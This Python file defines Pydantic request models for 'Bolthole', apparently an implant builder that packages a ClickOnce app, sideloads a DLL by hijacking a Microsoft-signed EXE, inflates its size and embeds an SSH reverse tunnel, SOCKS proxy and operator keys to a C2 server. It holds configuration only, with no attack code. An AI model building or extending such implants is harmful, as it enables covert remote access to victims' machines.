"""
Models for Bolthole build requests
"""

from pydantic import BaseModel


class BoltholePayload(BaseModel):
    """Model describing incoming POST request for a Bolthole build"""
    # Section A — ClickOnce packaging
    name: str           # ClickOnce app name
    sideload: str       # which Microsoft-signed EXE to hijack
    provider_url: str = ""  # HTTPS URL for deploymentProvider in .application (optional)
    version: str        # app version string (e.g. "1.0.0.0")
    inflate: int        # MB to inflate DLL (0–500)
    # Section B — Bolthole SSH tunnel (values compiled into the DLL)
    ssh_host: str       # C2 FQDN or IP
    ssh_user: str       # SSH username on C2
    ports: str          # comma-separated port scan order (e.g. "443,80,22,31337")
    tunnel_port: int    # reverse shell forward port (default 31332)
    socks_port: int     # remote dynamic SOCKS5 port (default 1080)
    startup_delay: int  # seconds to sleep before starting boltcon (default 5)
    reconnect_delay: int  # seconds to sleep between reconnect attempts (default 30)
    operator_pubkey: str = ""  # extra operator public keys appended to BoltFiles/authorized_keys


class BoltholeC2ConfigRequest(BaseModel):
    """POST body for saving the global C2 config and optionally rotating the keypair."""
    ssh_host: str
    ssh_user: str
    ports: str = "443,80,22,31337"
    tunnel_port: int = 31332
    socks_port: int = 1080
    startup_delay: int = 5
    reconnect_delay: int = 30
    regenerate_keypair: bool = False
